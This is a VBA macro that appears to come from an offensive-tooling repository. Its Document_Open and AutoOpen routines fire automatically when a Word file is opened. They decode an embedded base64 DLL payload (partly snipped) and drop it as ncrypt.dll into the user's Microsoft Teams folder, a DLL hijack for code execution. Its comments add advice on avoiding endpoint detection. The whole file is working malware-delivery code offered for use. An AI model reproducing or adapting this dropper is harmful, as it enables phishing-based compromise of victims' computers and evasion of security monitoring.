Sub Document_Open()
    drop
End Sub

Sub AutoOpen()
    drop
End Sub

Sub drop()

    Dim objShell As Object
    Dim X As Integer
    Dim url As String
    Dim b64 As String

    ' your base64 encoded payload that will be decoded to disk
    b64 = ""
    b64 = b64 & "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    b64 = b64 & "AAAAAAAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG"
    b64 = b64 & "1vZGUuDQ0KJAAAAAAAAADgqhmdpMt3zqTLd86ky3fOrbPkzqbLd859v3bPpst3zn2/cs+ty3fOf"
    b64 = b64 & "b9zz6zLd859v3TPp8t3zv+jds+hy3fOpMt2zobLd85+v37Ppst3zn6/iM6ly3fOfr91z6XLd85S"
    b64 = b64 & "aWNopMt3zgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFBFAABkhgYAtRsmYgAAAAAAAAAA8AAiIAs"
    b64 = b64 & "CDhwAEAAAABoAAAAAAACEEwAAABAAAAAAAIABAAAAABAAAAACAAAGAAAAAAAAAAYAAAAAAAAAAH"
                                        '<-- SNIP -->
    b64 = b64 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    b64 = b64 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    b64 = b64 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    b64 = b64 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    b64 = b64 & "AAAA=="
    p = "C:\Users\" & Environ$("username") & "\AppData\Local\Microsoft\Teams\current\ncrypt.dll"
    
    Open p For Binary As #1
       Put #1, 1, DecodeBase64(b64)
    Close #1

    ' THIS IS USING A DLL HIJACK - IF YOU NEED EXECUTION, FIGURE IT OUT YOURSELF.
    ' There is another macro in this repo that uses a scheduled task - I recommend using that.
    ' Spawning a process FROM Word WILL get you BURNT

End Sub

Private Function DecodeBase64(ByVal strData As String) As Byte()
    Dim objXML As Object 'MSXML2.DOMDocument
    Dim objNode As Object 'MSXML2.IXMLDOMElement
    'get dom document
    Set objXML = CreateObject("MSXML2.DOMDocument")
    'create node with type of base 64 and decode
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
    'clean up
    Set objNode = Nothing
    Set objXML = Nothing
End Function